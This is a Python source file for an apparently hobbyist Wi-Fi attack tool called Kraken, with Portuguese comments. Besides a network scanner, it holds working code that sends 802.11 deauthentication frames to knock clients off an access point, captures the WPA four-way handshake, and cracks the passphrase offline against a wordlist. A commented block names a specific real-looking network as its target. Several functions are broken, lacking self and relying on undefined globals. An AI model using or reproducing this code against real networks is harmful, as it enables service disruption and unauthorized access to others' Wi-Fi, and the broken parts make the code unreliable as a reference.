"""
MIT License

Copyright (c) 2025 0xf0xy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from scapy.all import (
    sniff,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    EAPOL,
    RadioTap,
    sendp,
    Packet,
)
import subprocess
import threading
import hashlib
import time
import hmac
import json
import os

RED = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
RESET = "\033[0m"


class Kraken:
    """
    Kraken:
    """

    def __init__(self):
        """
        Initialize Kraken instance and handhsake dictionary.
        """
        self.handshake = {}

    @staticmethod
    def start_monitor(iface: str):
        """
        Start monitor mode on the specified interface.

        Args:
            iface (str): Network interface to set to monitor mode.
        """
        try:
            subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
            subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
            subprocess.run(["ip", "link", "set", iface, "down"], check=True)
            subprocess.run(["iw", iface, "set", "type", "monitor"], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True)

        except subprocess.CalledProcessError:
            return

    @staticmethod
    def stop_monitor(iface: str):
        """
        Stop monitor mode on the specified interface.

        Args:
            iface (str): Network interface to stop monitor mode on.
        """
        try:
            subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
            subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
            subprocess.run(["ip", "link", "set", iface, "down"])
            subprocess.run(["iw", iface, "set", "type", "managed"], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"])
            subprocess.run(["systemctl", "start", "wpa_supplicant"], check=False)
            subprocess.run(["systemctl", "start", "NetworkManager"], check=False)

        except subprocess.CalledProcessError:
            return

    @staticmethod
    def print_networks(networks):
        """
        Print the discovered Wi-Fi networks in a formatted table.

        Args:
            networks (dict): Dictionary containing network information.
        """
        os.system("clear")
        print("BSSID              CH  PWR  ENC   BEAC  ESSID")
        print("-" * 60)

        for bssid, info in networks.items():
            ssid = info["ssid"] if info["ssid"] else "<oculta>"
            print(
                f"{bssid:<18} {info['channel']:<3} {info['signal']:<4} {info['encryption']:<5} {info['beacons']:<5} {ssid}"
            )

    def get_encryption(self, pkt: Packet) -> str:
        """
        Get the encryption type of a Wi-Fi packet.

        Args:
            pkt (Packet): Scapy packet containing Wi-Fi information.

        Returns:
            str: Encryption type (WEP, WPA, WPA2, Open).
        """
        if pkt.haslayer(Dot11Elt):
            elt = pkt.getlayer(Dot11Elt)

            while elt:
                if elt.ID == 48:
                    if b"\x00\x0f\xac\x04" in elt.info:
                        return "WPA2"

                if elt.ID == 221 and elt.info.startswith(b"\x00\x50\xf2\x01"):
                    return "WPA"

                elt = elt.payload.getlayer(Dot11Elt)

            return "WEP"

        else:
            return "Open"

    def sniff_networks(self, iface: str):
        """
        Sniff Wi-Fi networks and display their details.

        Args:
            iface (str): Network interface to sniff on.
        """
        networks = {}

        def handler(pkt: Packet):
            """Callback function to handle sniffed packets.

            Args:
                pkt: Sniffed packet.
            """
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                ssid = (
                    pkt[Dot11Elt].info.decode(errors="ignore")
                    if pkt.haslayer(Dot11Elt)
                    else ""
                )

                try:
                    dbm_signal = pkt.dBm_AntSignal

                except:
                    dbm_signal = "N/A"

                channel = None
                elt = pkt.getlayer(Dot11Elt)

                while elt:
                    if elt.ID == 3:
                        channel = elt.info[0]

                        break

                    elt = elt.payload.getlayer(Dot11Elt)

                encryption = self.get_encryption(pkt)

                if bssid not in networks:
                    networks[bssid] = {
                        "ssid": ssid,
                        "signal": dbm_signal,
                        "channel": channel if channel else "-",
                        "encryption": encryption,
                        "beacons": 1,
                    }

                else:
                    networks[bssid]["signal"] = dbm_signal
                    networks[bssid]["beacons"] += 1

                self.print_networks(networks)

        sniff(iface=iface, prn=handler)

    def deauth(self, iface, target_bssid, client=None, count=10):
        """
        Envia pacotes de deauth para o AP ou para um cliente específico.
        """
        dot11 = Dot11(
            type=0,
            subtype=12,
            addr1=client or "ff:ff:ff:ff:ff:ff",
            addr2=target_bssid,
            addr3=target_bssid,
        )
        pkt = RadioTap() / dot11 / ("".join([chr(0x00)] * 32))
        print(
            f"{RED}[*] Enviando {count} deauths para {client or 'broadcast'} via {target_bssid}{RESET}"
        )
        for _ in range(count):
            sendp(pkt, iface=iface, verbose=0)
            time.sleep(0.1)
        print(f"{GREEN}[✓] Deauth enviado!{RESET}")

    def channel_hopper(self, interface, delay=0.5, channels=None, stop_event=None):
        """
        Troca o canal da interface em modo monitor periodicamente.
        """
        if channels is None:
            channels = list(range(1, 14))  # Canais 1 a 13 (2.4GHz)
        if stop_event is None:
            stop_event = threading.Event()

        def hop():
            while not stop_event.is_set():
                for ch in channels:
                    if stop_event.is_set():
                        break
                    subprocess.run(
                        ["iw", interface, "set", "channel", str(ch)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    time.sleep(delay)

        thread = threading.Thread(target=hop, daemon=True)
        thread.start()
        return stop_event

    def handshake_handler(pkt):

        if pkt.haslayer(EAPOL):
            src = pkt.addr2.lower() if pkt.addr2 else ""
            dst = pkt.addr1.lower() if pkt.addr1 else ""

            try:
                raw = bytes(pkt.getlayer(EAPOL))
            except:
                return

            if target_bssid not in [src, dst]:
                return

            # Message 1: AP -> Client
            if src == target_bssid and not handshake.get("ANonce"):
                handshake["AP"] = src
                handshake["Client"] = dst
                handshake["ANonce"] = raw.hex()[34:98]
                print("[1] ANonce capturado")

            # Captura SNonce apenas se vier do cliente e ANonce já foi capturado
            elif (
                dst == target_bssid
                and handshake.get("ANonce")
                and not handshake.get("SNonce")
            ):
                handshake["SNonce"] = raw.hex()[34:98]
                handshake["MIC"] = raw.hex()[162:194]

                eapol_zeroed = bytearray(raw)
                eapol_zeroed[81:97] = b"\x00" * 16
                handshake["EAPOL"] = eapol_zeroed.hex()

                with open("handshake_data.json", "w") as f:
                    json.dump(handshake, f, indent=2)

                print("[✓] Handshake salvo com sucesso!")
                exit()

    def customPRF512(key, A, B):
        blen = 64
        i = 0
        R = b""
        while i <= ((blen * 8 + 159) // 160):
            hmacsha1 = hmac.new(key, A + b"\x00" + B + bytes([i]), hashlib.sha1)
            R += hmacsha1.digest()
            i += 1
        return R[:blen]

    # Função para verificar o MIC
    def check_mic(pmk, eapol_data, mic_to_test):
        A = b"Pairwise key expansion"
        B = (
            min(APmac, Clientmac)
            + max(APmac, Clientmac)
            + min(ANonce, SNonce)
            + max(ANonce, SNonce)
        )
        ptk = customPRF512(pmk, A, B)
        mic_key = ptk[:16]
        mic = hmac.new(mic_key, eapol_data, hashlib.sha1).digest()[:16]
        return mic == mic_to_test

    """# Carregar o handshake do JSON
    with open("handshake_data.json", "r") as f:
        handshake_info = json.load(f)

    # Informações do JSON
    SSID = "Fasipe Coordenação".encode(
        "utf-8"
    )  # O SSID da rede, pode ser passado ou lido diretamente do JSON
    APmac = bytes.fromhex(handshake_info["APmac"].replace(":", ""))
    Clientmac = bytes.fromhex(handshake_info["Clientmac"].replace(":", ""))
    ANonce = bytes.fromhex(handshake_info["ANonce"])
    SNonce = bytes.fromhex(handshake_info["SNonce"])
    MIC = bytes.fromhex(handshake_info["MIC"])
    EAPOL = bytes.fromhex(handshake_info["EAPOL"])"""

    # Função de quebra de senha
    def crack_password(wordlist_path):
        with open(wordlist_path, "r", encoding="utf-8") as f:
            for password in f:
                password = password.strip()
                print(f"Tentando senha: {password}")

                # Gerar PMK (Password Master Key) com o SSID e a passphrase
                pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), SSID, 4096, 32)

                # Verificar MIC
                if check_mic(pmk, EAPOL, MIC):
                    print(f"[💜] Senha encontrada: {password}")
                    return password
        print("[x] Nenhuma senha da wordlist funcionou.")


if __name__ == "__main__":
    kraken = Kraken()
    iface = "wlan0mon"  # ou sua interface em modo monitor

    cmd = input("Comando (scan/deauth/start/stop): ").strip()
    if cmd == "scan":
        kraken.sniff_networks(iface)
